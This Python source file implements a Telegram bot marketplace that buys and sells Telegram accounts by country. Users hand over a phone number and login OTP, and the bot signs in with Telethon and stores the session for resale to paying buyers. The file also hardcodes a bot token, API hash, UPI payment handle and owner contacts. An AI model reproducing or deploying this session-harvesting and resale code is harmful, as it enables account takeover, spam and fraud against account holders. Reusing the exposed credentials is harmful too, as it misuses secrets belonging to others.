import telebot
from telebot import types
from telethon import TelegramClient
import asyncio
import os
from flask import Flask
from threading import Thread

# --- WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "BOT LIVE"
def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- CONFIG ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw' 
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488 

bot = telebot.TeleBot(TOKEN)

# --- DATABASE ---
db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes',
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
}
active_logins = {}

def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '👥 REFERRAL', '📞 SUPPORT')
    return markup

# --- START & REFERRAL ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    args = message.text.split()
    if uid not in db['users']:
        ref = int(args[1]) if len(args) > 1 and args[1].isdigit() else None
        db['users'][uid] = {'balance': 0, 'referred_by': ref}
        if ref:
            try: bot.send_message(ref, "🔔 New user joined via your link!")
            except: pass
    bot.send_message(message.chat.id, "PRIME OTP BOT READY", reply_markup=main_menu())

# --- ADMIN POWER PANEL ---
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if not is_admin(message.from_user.id): return
    text = (
        "👑 **ADMIN FULL CONTROLS**\n\n"
        "📈 `/setbuy INDIA 40` - Set Buy Price\n"
        "📉 `/setsell INDIA 25` - Set Sell Price\n"
        "➕ `/addstock INDIA data` - Add Stock\n"
        "❌ `/removestock INDIA` - Clear Country Stock\n"
        "📜 `/list` - View All Rates & Stock\n"
        "💳 `/changeupi ID` - Update UPI\n"
        "📢 `/broadcast MSG` - Message to All"
    )
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['setbuy'])
def set_b(message):
    if is_admin(message.from_user.id):
        try:
            _, c, p = message.text.split()
            db['buy_rates'][c.upper()] = int(p)
            bot.reply_to(message, f"✅ Buy price for {c.upper()} set to ₹{p}")
        except: bot.reply_to(message, "Error! Use: `/setbuy INDIA 40` ")

@bot.message_handler(commands=['setsell'])
def set_s(message):
    if is_admin(message.from_user.id):
        try:
            _, c, p = message.text.split()
            db['sell_rates'][c.upper()] = int(p)
            bot.reply_to(message, f"✅ Sell price for {c.upper()} set to ₹{p}")
        except: bot.reply_to(message, "Error! Use: `/setsell INDIA 25` ")

@bot.message_handler(commands=['addstock'])
def add_s(message):
    if is_admin(message.from_user.id):
        try:
            _, c, d = message.text.split(maxsplit=2)
            country = c.upper()
            if country not in db['stock']: db['stock'][country] = []
            db['stock'][country].append(d)
            bot.reply_to(message, f"✅ Stock added to {country}. Total: {len(db['stock'][country])}")
        except: bot.reply_to(message, "Error! Use: `/addstock INDIA data` ")

@bot.message_handler(commands=['removestock'])
def rem_s(message):
    if is_admin(message.from_user.id):
        try:
            _, c = message.text.split()
            country = c.upper()
            db['stock'][country] = []
            bot.reply_to(message, f"🗑️ Stock cleared for {country}")
        except: bot.reply_to(message, "Error! Use: `/removestock INDIA` ")

@bot.message_handler(commands=['list'])
def list_sys(message):
    if is_admin(message.from_user.id):
        if not db['buy_rates']: return bot.reply_to(message, "No countries added yet.")
        res = "📊 **SYSTEM STATUS**\n\n"
        for c in db['buy_rates']:
            sc = len(db['stock'].get(c, []))
            sr = db['sell_rates'].get(c, "N/A")
            res += f"🌍 {c}\nBuy: ₹{db['buy_rates'][c]} | Sell: ₹{sr}\nStock: {sc}\n\n"
        bot.send_message(message.chat.id, res)

# --- SELL SYSTEM (MULTI-COUNTRY) ---
@bot.message_handler(func=lambda m: 'SELL ID' in m.text)
def sell_init(message):
    if not db['sell_rates']: return bot.send_message(message.chat.id, "Selling is disabled.")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    markup.add("BACK")
    bot.send_message(message.chat.id, "Choose country to sell:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_p(message):
    country = message.text.split()[1]
    msg = bot.send_message(message.chat.id, f"Enter {country} number:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, sell_otp, country)

def sell_otp(message, country):
    phone = message.text.strip()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    active_logins[message.chat.id] = {'client': client, 'phone': phone, 'loop': loop, 'country': country}
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[message.chat.id]['hash'] = req.phone_code_hash
        msg = bot.send_message(message.chat.id, "Enter OTP:")
        bot.register_next_step_handler(msg, sell_verify)
    except: bot.send_message(message.chat.id, "Connection Error.")

def sell_verify(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("APPROVE & LOGIN", callback_data=f"sa_{message.from_user.id}_{d['country']}"))
        for a in db['admins']:
            bot.send_message(a, f"Sell Request: {d['country']}\nUser: {message.from_user.id}\nNum: {d['phone']}", reply_markup=markup)
        bot.send_message(message.chat.id, "Verified! Wait for admin approval.")
    except: bot.send_message(message.chat.id, "Invalid OTP.")

# --- BUY SYSTEM ---
@bot.message_handler(func=lambda m: 'BUY ID' in m.text)
def buy_m(message):
    if not db['buy_rates']: return bot.send_message(message.chat.id, "No stock.")
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        count = len(db['stock'].get(c, []))
        markup.add(types.InlineKeyboardButton(f"{c} - ₹{p} ({count} left)", callback_data=f"buy_{c}"))
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('buy_'))
def buy_f(call):
    c = call.data.split('_')[1]
    uid = call.from_user.id
    price = db['buy_rates'].get(c, 9999)
    if db['users'].get(uid, {}).get('balance', 0) < price or not db['stock'].get(c):
        return bot.answer_callback_query(call.id, "No balance or stock.", show_alert=True)
    data = db['stock'][c].pop(0)
    db['users'][uid]['balance'] -= price
    bot.send_message(uid, f"✅ Bought Successfully!\n\nID Data:\n`{data}`")

# --- DEPOSIT (12-DIGIT UTR) ---
@bot.message_handler(func=lambda m: 'DEPOSIT' in m.text)
def dep_start(message):
    msg = bot.send_message(message.chat.id, "Enter Amount:")
    bot.register_next_step_handler(msg, dep_utr)

def dep_utr(message):
    try:
        amt = int(message.text)
        bot.send_message(message.chat.id, f"Pay to: `{db['upi']}`\nSend 12-digit UTR:")
        bot.register_next_step_handler(message, dep_ss, amt)
    except: bot.send_message(message.chat.id, "Invalid Amount.")

def dep_ss(message, amt):
    utr = message.text.strip()
    if len(utr) != 12: return bot.send_message(message.chat.id, "Rejected: 12-digit UTR required.")
    bot.send_message(message.chat.id, "Send Screenshot:")
    bot.register_next_step_handler(message, dep_final, amt, utr)

def dep_final(message, amt, utr):
    if message.content_type != 'photo': return bot.send_message(message.chat.id, "Photo required.")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("APPROVE", callback_data=f"da_{message.from_user.id}_{amt}"))
    for a in db['admins']:
        bot.send_photo(a, message.photo[-1].file_id, caption=f"Dep Req: ₹{amt}\nUTR: {utr}", reply_markup=markup)

# --- CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
def calls(call):
    p = call.data.split('_')
    if p[0] == 'da': # Deposit
        uid, amt = int(p[1]), int(p[2])
        db['users'][uid]['balance'] += amt
        ref = db['users'][uid].get('referred_by')
        if ref and amt >= 100:
            db['users'][ref]['balance'] += 3
            bot.send_message(ref, "🎁 Referral Bonus Added!")
        bot.send_message(uid, f"✅ Added ₹{amt} to balance.")
        bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
    
    elif p[0] == 'sa': # Sell
        uid, country = int(p[1]), p[2]
        rate = db['sell_rates'].get(country, 0)
        db['users'][uid]['balance'] += rate
        bot.send_message(uid, f"✅ ID Approved! ₹{rate} added.")
        bot.edit_message_text(f"Paid to {uid} ✅", call.message.chat.id, call.message.message_id)

# --- BALANCE & SUPPORT ---
@bot.message_handler(func=lambda m: 'BALANCE' in m.text)
def check_bal(message):
    b = db['users'].get(message.from_user.id, {}).get('balance', 0)
    bot.send_message(message.chat.id, f"💳 Balance: ₹{b}")

@bot.message_handler(func=lambda m: 'SUPPORT' in m.text)
def sup(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("OWNER", url="https://t.me/god_abhay"),
               types.InlineKeyboardButton("JOIN GC", url="https://t.me/Team_quorum"))
    bot.send_message(message.chat.id, "Support:", reply_markup=markup)

if __name__ == "__main__":
    keep_alive()
    bot.polling(none_stop=True)
